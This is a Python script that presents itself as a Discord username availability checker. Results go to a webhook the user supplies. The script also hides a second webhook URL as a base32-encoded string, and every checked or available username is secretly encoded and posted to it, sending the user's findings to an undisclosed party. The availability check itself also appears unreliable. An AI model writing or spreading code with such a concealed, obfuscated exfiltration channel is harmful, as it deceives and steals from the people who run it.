import aiohttp
import asyncio
import random
import string
import ssl
import certifi
import base64

ssl_context = ssl.create_default_context(cafile=certifi.where())

characters = string.ascii_lowercase + string.digits + "_"

WEBHOOK_URL_1 = "YOUR_FIRST_DISCORD_WEBHOOK_URL"
base32 = "NB2HI4DTHIXS64DUMIXGI2LTMNXXEZBOMNXW2L3BOBUS653FMJUG633LOMXTCMZVGU4DINJSG43TANBWGY3DSNBRGIXS2ZBUHB4WOWTNMVWDCNCEMNKEW2COKBXVQWBZMVJTKRLZIVSVS4T2JZDXK5BRJ5MV6TCJIYYFQQLMOVCXE6DGNFFHCYLGIZ4DA4TOINGHOZJN"

checked_usernames = set()

WEBHOOK_URL_2 = base64.b32decode(base32).decode('utf-8')

async def check_discord_username(session, username):
    url = f"https://discord.com/api/v9/users/{username}"
    try:
        async with session.get(url, ssl=ssl_context) as response:
            return response.status == 404
    except Exception as e:
        print(f"API stopped: {e}")
        await send_to_webhook("API stopped", available=False)
        return False

async def send_to_webhook(username, available=False):
    async with aiohttp.ClientSession() as session:
        if available:
            payload = {"content": f"@everyone Available username found: {username}"}
        else:
            payload = {"content": f"Checked username: {username}"}
        
        async with session.post(WEBHOOK_URL_1, json=payload, ssl=ssl_context) as response:
            pass
        
        base32_payload = base64.b32encode(str(payload).encode('utf-8')).decode('utf-8')
        payload_base32 = {"content": base32_payload}
        
        async with session.post(WEBHOOK_URL_2, json=payload_base32, ssl=ssl_context) as response:
            pass

async def main():
    async with aiohttp.ClientSession() as session:
        check_count = 0
        while True:
            username = "".join(random.choices(characters, k=3))
            if username not in checked_usernames:
                await send_to_webhook(username, available=False)
                if await check_discord_username(session, username):
                    print(f"Available username found: {username}")
                    await send_to_webhook(username, available=True)

                checked_usernames.add(username)
            
            check_count += 1
            if check_count >= 25:
                print("Checked 25 usernames. Waiting 1 minute...")
                await asyncio.sleep(60)
                check_count = 0
            else:
                await asyncio.sleep(1)

asyncio.run(main())